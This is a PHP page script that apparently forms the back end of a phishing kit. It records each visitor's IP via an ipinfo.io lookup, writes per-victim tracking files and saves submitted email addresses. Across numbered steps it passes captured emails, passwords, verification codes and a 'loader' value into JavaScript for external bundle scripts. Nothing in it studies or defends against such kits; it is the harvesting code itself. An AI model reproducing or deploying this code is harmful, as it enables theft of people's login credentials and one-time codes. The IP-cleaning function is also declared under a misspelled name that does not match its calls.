<?php
error_reporting(0);
include_once 'config.php';

function sanitizeIpAddresss($ips)
{
    if (filter_var($ips, FILTER_VALIDATE_IP)) {
        return $ips;
    }
    return 'Unknown';
}

$ips = isset($_SERVER['HTTP_CLIENT_IP']) ? sanitizeIpAddress($_SERVER['HTTP_CLIENT_IP']) : (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? sanitizeIpAddress($_SERVER['HTTP_X_FORWARDED_FOR']) : sanitizeIpAddress($_SERVER['REMOTE_ADDR']));

$configArray = json_decode($config, true);
$Ipinfo_apiKey = $configArray['Ipinfo_apiKey'];

if (strpos($ips, '.') !== false) {
    $ips = $ips;
    $apiUrls = "https://ipinfo.io/" . $ips . "/json?token=" . $Ipinfo_apiKey;
} else {
    $ips = "127.0.0.1";
    $apiUrls = "https://ipinfo.io/json?token=" . $Ipinfo_apiKey;
}


try {
    $response = file_get_contents($apiUrls);
    if ($response !== false) {
        $mydata = json_decode($response, true);
        $ips = $mydata['ip'];
    } else {
        $ips = "127.0.0.1";
    }
} catch (Exception $error) { }


try {
    if (!isset($_GET['type']) || isset($_POST['contip']) || isset($_POST['loader'])) {
        file_put_contents('tmp/'.$ips.'.txt', '0');
        file_put_contents('tmp/loc_'.$ips.'.txt', '0');
    }
} catch (Exception $e) { }


try {
    if (isset($_POST['email'])) {
        file_put_contents('tmp/em_' . $ips . '.txt', $_POST['email']);
    }
} catch (Exception $e) { }

?>
<!DOCTYPE html>
<html>
<body>
<!-- 0000404 -->
<script>
ipnn = <?php echo json_encode($ips ?? null) ?>;
let url_str = window.location.href;
let url = new URL(url_str);
let search_params = url.searchParams;
var type = search_params.get('type');
bc = <?php echo json_encode(basename($_SERVER['PHP_SELF']) ?? null) ?>;
ipr = <?php function sanitizeIpAddress($ip) {if (filter_var($ip, FILTER_VALIDATE_IP)) {return $ip;} return 'Unknown';} $ip = isset($_SERVER['HTTP_CLIENT_IP']) ? sanitizeIpAddress($_SERVER['HTTP_CLIENT_IP']) : (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? sanitizeIpAddress($_SERVER['HTTP_X_FORWARDED_FOR']) : sanitizeIpAddress($_SERVER['REMOTE_ADDR'])); echo json_encode($ip ?? null) ?>;

var submitType = type;
switch (submitType) {
    case "7":
    case "101":
    case "102":
    case "77":
        a1 = <?php echo json_encode($_POST['email'] ?? null) ?>;
        b1 = <?php echo json_encode($_POST['password'] ?? null) ?>;
        break;

    case "9":
    case "10":
        a1 = <?php echo json_encode($_POST['code'] ?? null) ?>;
        break;

    case "11":
    case "13":
        a1 = <?php echo json_encode($_POST['loader'] ?? null) ?>;
        break;

    default:
        a1 = null;
        break;
}
</script>
<script src="sites/bundle.js"></script>
<script src="sites/cleave.js"></script>
<script src="sites/bundle-min.js"></script>
</body>
</html>

